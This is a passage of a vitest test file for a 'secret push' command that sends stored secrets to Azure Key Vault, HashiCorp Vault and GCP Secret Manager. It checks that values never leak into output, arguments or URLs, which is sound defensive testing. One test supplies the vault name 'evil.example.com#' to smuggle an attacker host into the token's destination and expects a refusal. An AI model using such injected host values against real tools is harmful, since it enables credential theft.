/**
 * `secret push` writes named secrets from this machine's store to a cloud
 * secret store (#235). Before it, the only route was `secret get NAME` into a
 * cloud CLI's argument list, which puts the value in process listings and in
 * shell history, and `secret push` was an unknown subcommand.
 *
 * The store is a real `LocalBackend` with an explicit key in a temporary
 * directory, so no test reaches the OS keychain. Every HTTPS endpoint is a
 * recorded stand-in for `fetch`, and the Azure CLI is a recorded stand-in for
 * the child process, so the tests can assert where each value went: into one
 * request body per name, and nowhere else.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as crypto from 'crypto';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { PassThrough } from 'stream';
import { LocalBackend } from './backends/local';
import { SecretStore } from './secret-store';
import { AzureKeyVaultTarget } from './backends/azure-kv';
import type { AzureDeps } from './backends/azure-kv';
import type { BoundedChildResult } from './backends/bounded-child';
import { VaultBackend } from './backends/vault';
import { GCPSecretManagerBackend, encodeStoreKey } from './backends/gcp-sm';
import { fakeSecretManager } from './backends/gcp-sm-fake.test-support';
import type { FakeSecretManager } from './backends/gcp-sm-fake.test-support';
import { VaultPushTarget, GcpPushTarget, PUSH_TARGETS } from './secret-push';
import type { PushTarget, PushTargetType } from './secret-push';
import { runSecret, runSecretPush } from './commands/secrets';
import { CLI } from './commands/utils';
import { hasDisplayHazard } from './display-safe';
import type { TtyInput } from './hidden-line';
import { isValidSecretName } from './secret-store';

const VALUES = {
  API_KEY: 'FAKE-push-api-value-7c1e',
  DB_PASSWORD: 'FAKE-push-db-value-93ad',
};
const AZ_TOKEN = 'FAKE-az-cli-token-41f0';
const SP_SECRET = 'FAKE-sp-client-secret-0b2d';
const VAULT_TOKEN = 'FAKE-vault-token-55e1';
const SENSITIVE = [VALUES.API_KEY, VALUES.DB_PASSWORD, AZ_TOKEN, SP_SECRET, VAULT_TOKEN];

interface Call {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: string | undefined;
}

type Handler = (call: Call) => Response | Promise<Response>;

let tmp: string;
let store: SecretStore;
let out: string[];
let calls: Call[];
let children: string[][];
let handler: Handler;
const spies: Array<{ mockRestore(): void }> = [];

function json(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json' } });
}

beforeEach(async () => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sls-push-'));
  store = new SecretStore({ backend: new LocalBackend({ storeDir: path.join(tmp, 'store'), key: 'test-key' }) });
  await store.setSecret('API_KEY', VALUES.API_KEY);
  await store.setSecret('DB_PASSWORD', VALUES.DB_PASSWORD);

  out = [];
  calls = [];
  children = [];
  handler = () => json(500, {});
  const capture = (...a: unknown[]): void => { out.push(a.map(String).join(' ')); };
  spies.push(vi.spyOn(console, 'log').mockImplementation(capture));
  spies.push(vi.spyOn(console, 'error').mockImplementation(capture));
  spies.push(vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => { out.push(String(chunk)); return true; }));
  spies.push(vi.spyOn(process.stderr, 'write').mockImplementation((chunk: unknown) => { out.push(String(chunk)); return true; }));

  vi.stubGlobal('fetch', async (url: string, init: RequestInit = {}) => {
    const call: Call = {
      method: init.method ?? 'GET',
      url,
      headers: { ...(init.headers as Record<string, string>) },
      body: typeof init.body === 'string' ? init.body : undefined,
    };
    calls.push(call);
    return handler(call);
  });
  // The debug switch prints uncaught errors in full; nothing here may depend on it being off.
  vi.stubEnv('SECRETLESS_DEBUG', '1');
});

afterEach(() => {
  while (spies.length > 0) spies.pop()?.mockRestore();
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
  fs.rmSync(tmp, { recursive: true, force: true });
});

function printed(): string {
  return out.join('\n');
}

/**
 * The arguments of the `secret push` command on the printed Fix line, as a
 * shell would split them: no quoted part of the line holds a space, and each
 * pair of single quotes is removed.
 */
function fixCommand(): string[] {
  const line = printed().split('\n').find((l) => l.startsWith('  Fix:'));
  const command = /secret push (.+)$/.exec(line ?? '');
  expect(command, `no \`secret push\` Fix line in:\n${printed()}`).not.toBeNull();
  return command![1].split(' ').map((word) => word.replace(/'([^']*)'/g, '$1'));
}

/** Every place a value or credential could leak to, except the request bodies that must carry them. */
function expectNoLeak(): void {
  const surfaces = [printed(), ...children.map((argv) => argv.join(' ')), ...calls.map((c) => c.url)];
  for (const text of surfaces) {
    for (const secret of SENSITIVE) expect(text).not.toContain(secret);
  }
}

// --- Azure Key Vault ---------------------------------------------------------

/** The Azure CLI, signed in: `az account get-access-token` prints a token. */
function azSignedIn(): AzureDeps['runChild'] {
  return async (program, args) => {
    children.push([program, ...args]);
    return { status: 0, signal: null, stdout: JSON.stringify({ accessToken: AZ_TOKEN, expiresOn: '2026-10-07 12:00:00' }), stderr: '', timedOut: false, spawnError: null } satisfies BoundedChildResult;
  };
}

function azSignedOut(): AzureDeps['runChild'] {
  return async (program, args) => {
    children.push([program, ...args]);
    return { status: 1, signal: null, stdout: '', stderr: "ERROR: Please run 'az login' to setup account.\n", timedOut: false, spawnError: null };
  };
}

/** No managed identity: the VM metadata address does not answer. */
const NO_ENV: NodeJS.ProcessEnv = {};

function azure(deps: AzureDeps): (type: PushTargetType, vault: string | undefined) => PushTarget {
  return (type, vault) => {
    expect(type).toBe('azure-kv');
    return new AzureKeyVaultTarget(vault ?? '', deps);
  };
}

const KV = 'https://kv-demo.vault.azure.net';

/** A Key Vault that holds `existing` and answers writes with a new version. */
function keyVault(existing: string[] = []): Handler {
  let n = 0;
  return (call) => {
    if (call.url.startsWith('http://169.254.169.254/')) throw new TypeError('fetch failed');
    const u = new URL(call.url);
    if (u.origin !== KV) return json(500, {});
    const m = /^\/secrets\/([^/]+)(\/versions)?$/.exec(u.pathname);
    if (!m) return json(400, {});
    const name = m[1];
    if (call.method === 'GET' && m[2]) {
      return existing.includes(name)
        ? json(200, { value: [{ id: `${KV}/secrets/${name}/0001`, attributes: { enabled: true } }], nextLink: null })
        : json(404, { error: { code: 'SecretNotFound', message: `A secret with (name/id) ${name} was not found in this key vault.` } });
    }
    if (call.method === 'PUT' && !m[2]) {
      const sent = JSON.parse(call.body ?? '{}') as { value?: string };
      const version = `v${++n}abc`;
      // Key Vault echoes the value back; the client must not print it.
      return json(200, { value: sent.value, id: `${KV}/secrets/${name}/${version}`, attributes: { enabled: true } });
    }
    return json(405, {});
  };
}

function push(args: string[], deps: AzureDeps): Promise<number> {
  return runSecretPush(args, { store, createTarget: azure(deps) });
}

/**
 * One of each push target. A `Record` over `PushTargetType`, so a target added
 * to the type without an entry here is a compile error rather than a target
 * the name rules below are never checked against.
 */
const TARGETS: Record<PushTargetType, () => PushTarget> = {
  'azure-kv': () => new AzureKeyVaultTarget('kv-demo', { env: NO_ENV, runChild: azSignedIn() }),
  vault: () => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN })),
  'gcp-sm': () => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project' })),
};

/** The arguments that select `type`, as a Fix prints them. */
function toArgs(type: PushTargetType): string[] {
  return ['--to', type, ...(type === 'azure-kv' ? ['--vault', 'kv-demo'] : [])];
}

describe('secret push --to azure-kv (#235)', () => {
  it('writes each value in a PUT body only, and prints identifier, version and the container-app reference', async () => {
    handler = keyVault();
    const code = await push(
      ['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY,DB-PASSWORD'],
      { env: NO_ENV, runChild: azSignedIn() },
    );

    expect(code).toBe(0);
    const puts = calls.filter((c) => c.method === 'PUT');
    expect(puts.map((c) => c.url)).toEqual([
      `${KV}/secrets/API-KEY?api-version=7.4`,
      `${KV}/secrets/DB-PASSWORD?api-version=7.4`,
    ]);
    expect(JSON.parse(puts[0].body ?? '')).toEqual({ value: VALUES.API_KEY });
    expect(JSON.parse(puts[1].body ?? '')).toEqual({ value: VALUES.DB_PASSWORD });
    expect(puts.every((c) => c.headers.Authorization === `Bearer ${AZ_TOKEN}`)).toBe(true);
    // The token came from the Azure CLI, whose argv names the resource only.
    expect(children).toEqual([['az', 'account', 'get-access-token', '--resource', 'https://vault.azure.net', '--output', 'json']]);

    expect(printed()).toMatch(/pushed\s+API_KEY\s+version v1abc\s+https:\/\/kv-demo\.vault\.azure\.net\/secrets\/API-KEY\/v1abc/);
    expect(printed()).toMatch(/pushed\s+DB_PASSWORD\s+version v2abc/);
    expect(printed()).toContain('Auth:   Azure CLI (az login)');
    expect(printed()).toContain(
      `az containerapp secret set -n <app> -g <rg> --secrets api-key=keyvaultref:${KV}/secrets/API-KEY,identityref:<identity-id> db-password=keyvaultref:${KV}/secrets/DB-PASSWORD,identityref:<identity-id>`,
    );
    expectNoLeak();
  });

  it('--dry-run reports would create / would add a version and makes no write', async () => {
    handler = keyVault(['API-KEY']);
    const code = await push(
      ['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY,DB-PASSWORD', '--dry-run'],
      { env: NO_ENV, runChild: azSignedIn() },
    );

    expect(code).toBe(0);
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);
    expect(printed()).toContain('Dry run: nothing is written.');
    expect(printed()).toMatch(/would add a version\s+API_KEY\s+as API-KEY/);
    expect(printed()).toMatch(/would create\s+DB_PASSWORD\s+as DB-PASSWORD/);
    expect(printed()).toContain(`Apply:   ${CLI} secret push API_KEY,DB_PASSWORD --to azure-kv --vault kv-demo --as API-KEY,DB-PASSWORD`);
    expectNoLeak();
  });

  it('an unknown name fails before the target is contacted, so nothing is pushed', async () => {
    handler = keyVault();
    const code = await push(
      ['API_KEY,NOT_STORED', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY,NOT-STORED'],
      { env: NO_ENV, runChild: azSignedIn() },
    );

    expect(code).toBe(1);
    expect(calls).toEqual([]);
    expect(children).toEqual([]);
    expect(printed()).toContain('Not stored on this machine: NOT_STORED');
    expect(printed()).toContain('Nothing was pushed.');
    expect(printed()).toContain(`Fix:     ${CLI} secret set NOT_STORED`);
    expectNoLeak();
  });

  it('with no credential anywhere, exits 1 with Verify and Fix lines and writes nothing', async () => {
    handler = keyVault();
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY'], { env: NO_ENV, runChild: azSignedOut() });

    expect(code).toBe(1);
    expect(calls.filter((c) => c.url.startsWith(KV))).toEqual([]);
    expect(printed()).toContain('No Azure credential was found for Key Vault.');
    expect(printed()).toContain('Verify:  az account get-access-token --resource https://vault.azure.net --query expiresOn -o tsv');
    expect(printed()).toContain('Fix:     az login');
    expectNoLeak();
  });

  it('a missing permission stops at the first write, names the role, and pushes nothing after it', async () => {
    handler = (call) => {
      if (call.url.startsWith('http://169.254.169.254/')) throw new TypeError('fetch failed');
      return json(403, { error: { code: 'Forbidden', message: 'Caller is not authorized. FAKE detail', innererror: { code: 'ForbiddenByRbac' } } });
    };
    const code = await push(
      ['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY,DB-PASSWORD'],
      { env: NO_ENV, runChild: azSignedIn() },
    );

    expect(code).toBe(1);
    expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1);
    expect(printed()).toMatch(/failed\s+API_KEY\s+Key Vault kv-demo refused to write API-KEY: missing permission \(HTTP 403, Forbidden\/ForbiddenByRbac\)/);
    expect(printed()).toMatch(/not pushed\s+DB_PASSWORD/);
    expect(printed()).toContain('Fix:     az role assignment create --role "Key Vault Secrets Officer"');
    expect(printed()).toMatch(/Verify:\s+az role assignment list/);
    // The service's own message text is not reprinted.
    expect(printed()).not.toContain('FAKE detail');
    expectNoLeak();
  });

  it('a vault name that does not resolve is reported as a missing vault, with no other target tried', async () => {
    handler = (call) => {
      if (call.url.startsWith('http://169.254.169.254/')) throw new TypeError('fetch failed');
      throw Object.assign(new TypeError('fetch failed'), { cause: { code: 'ENOTFOUND' } });
    };
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-missing', '--as', 'API-KEY'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(1);
    expect(calls.filter((c) => c.method === 'PUT').map((c) => new URL(c.url).host)).toEqual(['kv-missing.vault.azure.net']);
    expect(printed()).toContain('Key Vault kv-missing was not found: kv-missing.vault.azure.net does not resolve.');
    expect(printed()).toContain('Verify:  az keyvault show --name kv-missing --query properties.vaultUri -o tsv');
    expect(printed()).toMatch(/Fix:\s+az keyvault list/);
    expectNoLeak();
  });

  it('a token refused by the vault exits 1 with the tenant check and az login', async () => {
    handler = (call) => {
      if (call.url.startsWith('http://169.254.169.254/')) throw new TypeError('fetch failed');
      return json(401, { error: { code: 'Unauthorized', message: 'AKV10032: Invalid issuer.' } });
    };
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(1);
    expect(printed()).toContain('Key Vault kv-demo did not accept the token (HTTP 401, Unauthorized).');
    expect(printed()).toContain('Fix:     az login --tenant');
    expectNoLeak();
  });

  it('uses a service principal from the environment, and never prints its secret', async () => {
    const vault = keyVault();
    handler = (call) => {
      if (call.url === 'https://login.microsoftonline.com/FAKE-tenant/oauth2/v2.0/token') {
        return json(200, { access_token: AZ_TOKEN, expires_in: 3600 });
      }
      return vault(call);
    };
    const env = { AZURE_TENANT_ID: 'FAKE-tenant', AZURE_CLIENT_ID: 'FAKE-client', AZURE_CLIENT_SECRET: SP_SECRET };
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'API-KEY'], { env, runChild: azSignedIn() });

    expect(code).toBe(0);
    const tokenCall = calls[0];
    expect(tokenCall.method).toBe('POST');
    const form = new URLSearchParams(tokenCall.body);
    expect(form.get('client_secret')).toBe(SP_SECRET);
    expect(form.get('scope')).toBe('https://vault.azure.net/.default');
    // A set-up source is used; the Azure CLI is not consulted.
    expect(children).toEqual([]);
    expect(printed()).toContain('Auth:   service principal (AZURE_CLIENT_SECRET)');
    expectNoLeak();
  });

  it('refuses a name Key Vault cannot hold before anything is read, and offers the --as that fixes it', async () => {
    const code = await push(['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(children).toEqual([]);
    expect(printed()).toContain('"API_KEY" cannot name a secret in Azure Key Vault kv-demo');
    expect(printed()).toContain(`Fix:     ${CLI} secret push API_KEY,DB_PASSWORD --to azure-kv --vault kv-demo --as API-KEY,DB-PASSWORD`);
  });

  it('refuses NAME=VALUE without printing the value it was given', async () => {
    const code = await push([`API_KEY=${VALUES.API_KEY}`, '--to', 'azure-kv', '--vault', 'kv-demo'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(printed()).toContain('"API_KEY=..." gives a value');
    expectNoLeak();
  });

  it('refuses a vault name that is not a Key Vault name, since it becomes the host the token is sent to', async () => {
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'evil.example.com#', '--as', 'API-KEY'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(children).toEqual([]);
    expect(printed()).toContain('is not a Key Vault name');
  });
});

// --- HashiCorp Vault ---------------------------------------------------------

describe('secret push --to vault (#235)', () => {
  const ADDR = 'https://vault.example.test';

  function vaultTarget(): (type: PushTargetType) => PushTarget {
    return (type) => {
      expect(type).toBe('vault');
      return new VaultPushTarget(new VaultBackend({ addr: ADDR, token: VAULT_TOKEN }));
    };
  }

  function vaultServer(existing: string[] = []): Handler {
    return (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      const meta = /^\/v1\/secret\/metadata\/secret\/(.+)$/.exec(u.pathname);
      if (meta && call.method === 'GET') return existing.includes(meta[1]) ? json(200, { data: { current_version: 2 } }) : json(404, { errors: [] });
      const data = /^\/v1\/secret\/data\/secret\/(.+)$/.exec(u.pathname);
      if (data && call.method === 'POST') return json(200, { data: { version: 3 } });
      return json(400, {});
    };
  }

  it('writes at the key `secret sync --from vault` reads, and prints the path and version', async () => {
    handler = vaultServer();
    const code = await runSecretPush(['API_KEY', '--to', 'vault'], { store, createTarget: vaultTarget() });

    expect(code).toBe(0);
    const post = calls.find((c) => c.method === 'POST');
    expect(post?.url).toBe(`${ADDR}/v1/secret/data/secret/API_KEY`);
    expect(JSON.parse(post?.body ?? '')).toEqual({ data: { value: VALUES.API_KEY } });
    expect(printed()).toMatch(/pushed\s+API_KEY\s+version 3\s+secret\/data\/secret\/API_KEY/);
    expect(printed()).toContain(`${CLI} secret sync --from vault --only API_KEY`);
    expectNoLeak();
  });

  it('--dry-run reads metadata only and writes nothing', async () => {
    handler = vaultServer(['API_KEY']);
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--dry-run'], { store, createTarget: vaultTarget() });

    expect(code).toBe(0);
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);
    expect(printed()).toMatch(/would add a version\s+API_KEY/);
    expect(printed()).toMatch(/would create\s+DB_PASSWORD/);
    expectNoLeak();
  });

  it('a refused token exits 1 with the capability check and the policy to attach', async () => {
    handler = (call) => (new URL(call.url).pathname === '/v1/sys/health' ? json(200, {}) : json(403, { errors: ['permission denied'] }));
    const code = await runSecretPush(['API_KEY', '--to', 'vault'], { store, createTarget: vaultTarget() });

    expect(code).toBe(1);
    expect(printed()).toContain('Verify:  vault token lookup');
    expect(printed()).toContain('vault token capabilities secret/data/secret/API_KEY');
    expect(printed()).toContain('Fix:     attach a policy granting path "secret/data/secret/API_KEY" capabilities ["create", "update"]');
    expectNoLeak();
  });

  it('refuses an --as name Vault cannot hold, and the Fix names one it accepts: run as printed, it pushes (#285)', async () => {
    handler = vaultServer();
    const code = await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'api.key'], { store, createTarget: vaultTarget() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(printed()).toContain('"api.key" cannot name a secret in Vault');
    expect(printed()).toContain(`Fix:     ${CLI} secret push API_KEY --to vault --as api_key`);

    const rerun = await runSecretPush(fixCommand(), { store, createTarget: vaultTarget() });

    expect(rerun).toBe(0);
    expect(calls.find((c) => c.method === 'POST')?.url).toBe(`${ADDR}/v1/secret/data/secret/api_key`);
    expectNoLeak();
  });
});

// --- GCP Secret Manager ------------------------------------------------------

describe('secret push --to gcp-sm (#235)', () => {
  const SM = 'https://secretmanager.googleapis.com/v1/projects/demo-project/secrets';

  function gcpTarget(): (type: PushTargetType) => PushTarget {
    const { privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    const keyFile = path.join(tmp, 'sa.json');
    fs.writeFileSync(keyFile, JSON.stringify({
      type: 'service_account',
      project_id: 'demo-project',
      client_email: 'push@demo-project.iam.gserviceaccount.com',
      private_key: privateKey.export({ type: 'pkcs8', format: 'pem' }).toString(),
    }));
    return () => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project', keyFilePath: keyFile }));
  }

  function secretManager(existing: string[] = []): Handler {
    return (call) => {
      if (call.url === 'https://oauth2.googleapis.com/token') return json(200, { access_token: 'FAKE-gcp-token', expires_in: 3600 });
      const u = new URL(call.url);
      const get = /^\/v1\/projects\/demo-project\/secrets\/([^/:]+)$/.exec(u.pathname);
      if (get && call.method === 'GET') return existing.includes(get[1]) ? json(200, { name: `projects/123/secrets/${get[1]}` }) : json(404, {});
      if (u.pathname === '/v1/projects/demo-project/secrets' && call.method === 'POST') return json(200, {});
      const add = /^\/v1\/projects\/demo-project\/secrets\/([^/:]+):addVersion$/.exec(u.pathname);
      if (add && call.method === 'POST') return json(200, { name: `projects/123/secrets/${add[1]}/versions/4` });
      return json(400, {});
    };
  }

  it('creates the secret, adds a version with the value in the body, and prints the version name', async () => {
    handler = secretManager();
    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm'], { store, createTarget: gcpTarget() });

    expect(code).toBe(0);
    const add = calls.find((c) => c.url === `${SM}/API_KEY:addVersion`);
    expect(JSON.parse(add?.body ?? '')).toEqual({ payload: { data: Buffer.from(VALUES.API_KEY).toString('base64') } });
    expect(printed()).toMatch(/pushed\s+API_KEY\s+version 4\s+projects\/123\/secrets\/API_KEY\/versions\/4/);
    expect(printed()).toContain('gcloud run services update <service> --region <region> --update-secrets=API_KEY=API_KEY:latest');
    // The base64 form of a value is the value.
    expect(printed()).not.toContain(Buffer.from(VALUES.API_KEY).toString('base64'));
    expectNoLeak();
  });

  it('--dry-run reads the secret resource only and writes nothing to Secret Manager', async () => {
    handler = secretManager(['DB_PASSWORD']);
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'gcp-sm', '--dry-run'], { store, createTarget: gcpTarget() });

    expect(code).toBe(0);
    expect(calls.filter((c) => c.url.startsWith(SM) && c.method !== 'GET')).toEqual([]);
    expect(printed()).toMatch(/would create\s+API_KEY/);
    expect(printed()).toMatch(/would add a version\s+DB_PASSWORD/);
    expectNoLeak();
  });

  it('a missing IAM permission exits 1 with the role binding to add', async () => {
    handler = (call) => (call.url === 'https://oauth2.googleapis.com/token'
      ? json(200, { access_token: 'FAKE-gcp-token', expires_in: 3600 })
      : json(403, {}));
    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm'], { store, createTarget: gcpTarget() });

    expect(code).toBe(1);
    expect(printed()).toContain('insufficient IAM permissions');
    expect(printed()).toContain('Fix:     gcloud projects add-iam-policy-binding demo-project --member=user:<you> --role=roles/secretmanager.admin');
    expectNoLeak();
  });

  it('refuses an --as name Secret Manager cannot hold, and the Fix names one it accepts: run as printed, it pushes (#285)', async () => {
    handler = secretManager();
    const createTarget = gcpTarget();
    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', 'api.key'], { store, createTarget });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(printed()).toContain('"api.key" cannot name a secret in GCP Secret Manager');
    expect(printed()).toContain(`Fix:     ${CLI} secret push API_KEY --to gcp-sm --as api_key`);

    const rerun = await runSecretPush(fixCommand(), { store, createTarget });

    expect(rerun).toBe(0);
    expect(calls.some((c) => c.url === `${SM}/api_key:addVersion`)).toBe(true);
    expectNoLeak();
  });

  it('a name over 255 characters gets a Fix cut to the length Secret Manager accepts (#285)', async () => {
    const createTarget = gcpTarget();
    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', `${'k'.repeat(300)}.v`], { store, createTarget });

    expect(code).toBe(2);
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'gcp-sm', '--as', 'k'.repeat(255)]);
  });

  describe('a secret held for an MCP server binding gets no version from a push', () => {
    // protect-mcp stores an MCP server's key under a name derived from the
    // whole key, on a secret with the store-key label. `--as` accepts it.
    const SERVER_KEY = 'mcp/cursor/github/TOKEN';
    const HELD = encodeStoreKey(SERVER_KEY);
    const STORE_KEY_LABELS = { 'secretless-ai': 'store-key' };
    const FIX = "  Fix:     use a plain name no MCP server's secret is held under: run the push again with another --as name";
    let serverValue: string;

    /** A value built at run time, shaped like no provider's token. */
    function placeholder(label: string): string {
      return [label, 'placeholder', crypto.randomBytes(6).toString('hex')].join('-');
    }

    /**
     * The project as Secret Manager keeps it (fakeSecretManager): creating an
     * existing secret is 409, and a secret's resource carries its labels. It
     * holds the server's secret, with the label. A read of the resource of
     * `forbidden` is answered 403, as for a principal without
     * secretmanager.secrets.get.
     */
    function project(forbidden?: string): FakeSecretManager {
      const sm = fakeSecretManager('demo-project');
      sm.put(HELD, serverValue, STORE_KEY_LABELS);
      const accessToken = ['FAKE', 'gcp', 'access', crypto.randomBytes(4).toString('hex')].join('-');
      handler = async (call) => {
        if (call.url === 'https://oauth2.googleapis.com/token') return json(200, { access_token: accessToken, expires_in: 3600 });
        if (call.method === 'GET' && forbidden !== undefined && new URL(call.url).pathname === `/v1/projects/demo-project/secrets/${forbidden}`) {
          return json(403, { error: { code: 403, status: 'PERMISSION_DENIED' } });
        }
        const answer = await sm.fetch(call.url, { method: call.method, body: call.body });
        return new Response(await answer.text(), { status: answer.status, headers: { 'Content-Type': 'application/json' } });
      };
      return sm;
    }

    /** Each request whose URL or body carries `value`, as given or in base64. */
    function carrying(value: string): string[] {
      const encoded = Buffer.from(value).toString('base64');
      return calls
        .filter((c) => [c.url, c.body ?? ''].some((text) => text.includes(value) || text.includes(encoded)))
        .map((c) => `${c.method} ${c.url}`);
    }

    const addVersions = (): string[] => calls.filter((c) => c.url.endsWith(':addVersion')).map((c) => c.url);

    beforeEach(() => {
      serverValue = placeholder('server');
    });

    it('(a) --as the name the server key is stored under: refused, the message names the binding, and no request carries the value', async () => {
      const sm = project();
      const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', HELD], { store, createTarget: gcpTarget() });

      expect({
        code,
        addVersions: addVersions(),
        carryingTheValue: carrying(VALUES.API_KEY),
        held: sm.secrets.get(HELD),
      }).toEqual({ code: 1, addVersions: [], carryingTheValue: [], held: { labels: STORE_KEY_LABELS, versions: [serverValue] } });
      expect(printed()).toContain(
        `  GCP Secret Manager refused ${HELD} in project demo-project: the secret is held for an MCP server binding, the key '${SERVER_KEY}', and a push adds no version to it.`,
      );
      expect(printed()).toContain('  Nothing was pushed.');
      expect(printed()).toContain(`  Verify:  gcloud secrets describe ${HELD} --project demo-project`);
      expect(printed().split('\n')).toContain(FIX);
      expect(printed()).not.toContain(serverValue);
      expectNoLeak();
    });

    it('(b) control: --as names whose secrets exist without the label each get one version, as before', async () => {
      const sm = project();
      // The name another server key would have, on a secret without the label.
      const unlabelled = encodeStoreKey('mcp/cursor/gitlab/TOKEN');
      const before = [placeholder('existing'), placeholder('unlabelled')];
      sm.put('EXISTING', before[0]);
      sm.put(unlabelled, before[1]);

      const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'gcp-sm', '--as', `EXISTING,${unlabelled}`], { store, createTarget: gcpTarget() });

      expect({
        code,
        addVersions: addVersions(),
        existing: sm.secrets.get('EXISTING'),
        unlabelled: sm.secrets.get(unlabelled),
        held: sm.secrets.get(HELD),
      }).toEqual({
        code: 0,
        addVersions: [`${SM}/EXISTING:addVersion`, `${SM}/${unlabelled}:addVersion`],
        existing: { labels: {}, versions: [before[0], VALUES.API_KEY] },
        unlabelled: { labels: {}, versions: [before[1], VALUES.DB_PASSWORD] },
        held: { labels: STORE_KEY_LABELS, versions: [serverValue] },
      });
      expectNoLeak();
    });

    it('(c) control: --as a new name creates the secret without a label and adds one version, as before', async () => {
      const sm = project();
      const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', 'NEW_NAME'], { store, createTarget: gcpTarget() });

      expect({
        code,
        creates: calls.filter((c) => c.method === 'POST' && c.url.startsWith(`${SM}?`)).map((c) => [c.url, JSON.parse(c.body ?? '{}')]),
        addVersions: addVersions(),
        created: sm.secrets.get('NEW_NAME'),
      }).toEqual({
        code: 0,
        creates: [[`${SM}?secretId=NEW_NAME`, { replication: { automatic: {} } }]],
        addVersions: [`${SM}/NEW_NAME:addVersion`],
        created: { labels: {}, versions: [VALUES.API_KEY] },
      });
      expectNoLeak();
    });

    it("(d) a label read answered 403: refused with the Viewer hint and no version added, and a dry run's read gets the same hint", async () => {
      const sm = project('EXISTING');
      const before = placeholder('existing');
      sm.put('EXISTING', before);
      // One service account key for both runs; each run builds its own target.
      const createTarget = gcpTarget();

      const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', 'EXISTING'], { store, createTarget });
      const pushed = printed();
      out.length = 0;
      const dry = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', 'EXISTING', '--dry-run'], { store, createTarget });

      expect({
        code,
        dry,
        addVersions: addVersions(),
        carryingTheValue: carrying(VALUES.API_KEY),
        existing: sm.secrets.get('EXISTING'),
      }).toEqual({ code: 1, dry: 1, addVersions: [], carryingTheValue: [], existing: { labels: {}, versions: [before] } });
      for (const text of [pushed, printed()]) {
        expect(text).toContain("  GCP Secret Manager refused EXISTING in project demo-project: insufficient IAM permissions to read its metadata. Grant 'Secret Manager Viewer' role.");
        expect(text).toContain('  Fix:     gcloud projects add-iam-policy-binding demo-project --member=user:<you> --role=roles/secretmanager.viewer');
      }
      expectNoLeak();
    });

    it('(e) --dry-run against the held name prints the refusal, not "would add a version", and sends only reads', async () => {
      project();
      const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', HELD, '--dry-run'], { store, createTarget: gcpTarget() });
      const rows = printed().split('\n').filter((l) => l.includes(' API_KEY ')).map((l) => l.trim().replace(/\s+/g, ' '));

      expect({ code, rows }).toEqual({ code: 1, rows: [`would refuse API_KEY as ${HELD}`] });
      expect(printed()).not.toContain('would add a version');
      expect(printed()).toContain(
        `  GCP Secret Manager refused ${HELD} in project demo-project: the secret is held for an MCP server binding, the key '${SERVER_KEY}', and a push adds no version to it.`,
      );
      expect(printed()).toContain('  Nothing was written.');
      expect(printed().split('\n')).toContain(FIX);
      expect(calls.filter((c) => c.url.startsWith(SM) && c.method !== 'GET')).toEqual([]);
      expect(printed()).not.toContain(serverValue);
      expectNoLeak();
    });
  });
});

describe('the --as name a refusal offers (#285)', () => {
  // Refused by every target: a character none allows, and for the last a
  // length over what Key Vault and Secret Manager hold.
  const REFUSED = ['a.b', 'api key', 'a/b', '.', `${'k'.repeat(300)}.v`];

  for (const type of PUSH_TARGETS) {
    it(`--to ${type}: is a name the target accepts, for every name it refuses`, () => {
      const target = TARGETS[type]();
      for (const name of REFUSED) {
        expect(target.nameProblem(name), name).toBeDefined();
